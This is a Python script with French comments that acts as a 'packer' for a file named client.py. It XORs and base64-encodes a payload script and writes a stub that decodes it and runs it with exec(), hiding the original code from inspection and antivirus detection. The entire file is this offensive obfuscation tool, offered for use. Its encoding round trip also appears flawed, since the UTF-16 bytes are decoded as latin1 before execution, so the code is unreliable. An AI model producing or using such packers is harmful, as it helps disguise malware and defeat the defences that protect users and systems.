import base64
import argparse
import os

# Fonction pour appliquer un XOR au contenu
def xor_data(data, key):
    return ''.join(chr(ord(char) ^ key) for char in data)

# Fonction principale pour encoder et packer
def encode_and_pack(payload_path, key, output_path):
    with open(payload_path, 'r') as f:
        content = f.read()

    print("[+] Encodage du contenu en UTF-16-LE")
    utf16_content = content.encode('utf-16-le')

    print("[+] Application de l'opération XOR avec la clé :", key)
    xor_content = xor_data(utf16_content.decode('latin1'), key).encode('latin1')

    print("[+] Encodage Base64")
    base64_content = base64.b64encode(xor_content).decode('utf-8')

    print("[+] Insertion dans le fichier modèle")
    template = f"""
import base64

# Fonction de déchiffrement XOR
def xor_decrypt(data, key):
    return ''.join(chr(ord(char) ^ key) for char in data)

# Charge utile encodée
encoded_payload = "{base64_content}"
key = {key}

# Décodage de la charge utile
decoded_payload = base64.b64decode(encoded_payload.encode('utf-8'))
xor_decoded_payload = xor_decrypt(decoded_payload.decode('latin1'), key)

# Exécution dynamique
exec(xor_decoded_payload)
"""

    with open(output_path, 'w') as f:
        f.write(template)

    print(f"[+] Script packé écrit dans : {output_path}")

# Analyse des arguments
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Packer pour client.py")
    parser.add_argument("-p", "--payload", required=True, help="Chemin du script original à packer")
    parser.add_argument("-k", "--key", required=True, type=int, help="Clé pour l'opération XOR")
    parser.add_argument("-o", "--output", required=True, help="Chemin du fichier packé de sortie")
    args = parser.parse_args()

    encode_and_pack(args.payload, args.key, args.output)
